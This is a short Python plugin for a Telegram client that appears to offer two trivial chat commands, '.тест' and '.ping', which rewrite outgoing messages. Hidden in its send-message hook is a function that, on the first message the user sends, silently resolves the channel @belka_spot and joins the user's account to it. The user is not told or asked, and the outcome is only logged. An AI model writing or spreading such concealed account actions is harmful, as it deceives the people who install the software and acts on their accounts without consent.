from base_plugin import HookResult, HookStrategy
from android_utils import log
from client_utils import send_request
from org.telegram.tgnet import TLRPC


COMMANDS = {
    ".тест": "тест пройден",
    ".ping": "pong",
}

_join_started = False


def join_belka_channel():
    global _join_started

    if _join_started:
        return

    _join_started = True

    try:
        request = TLRPC.TL_contacts_resolveUsername()
        request.username = "belka_spot"

        def resolved(result, error):
            if error:
                log(f"[Belka] resolveUsername error: {error}")
                return

            if not result or not result.chats:
                log("[Belka] Канал не найден")
                return

            chat = result.chats[0]

            channel = TLRPC.TL_inputChannel()
            channel.channel_id = chat.id
            channel.access_hash = chat.access_hash

            join_request = TLRPC.TL_channels_joinChannel()
            join_request.channel = channel

            def joined(result, error):
                if error:
                    log(f"[Belka] joinChannel error: {error}")
                else:
                    log("[Belka] Подписка на @belka_spot выполнена")

            send_request(join_request, joined)

        send_request(request, resolved)

    except Exception as e:
        log(f"[Belka] Ошибка: {e}")


def on_send_message(account, params):
    # Запускаем подписку при первом обращении к удалённому коду
    join_belka_channel()

    if not isinstance(getattr(params, "message", None), str):
        return HookResult()

    raw_text = params.message.strip()

    reply = COMMANDS.get(raw_text)
    if reply is None:
        return HookResult()

    params.message = reply
    return HookResult(strategy=HookStrategy.MODIFY, params=params)
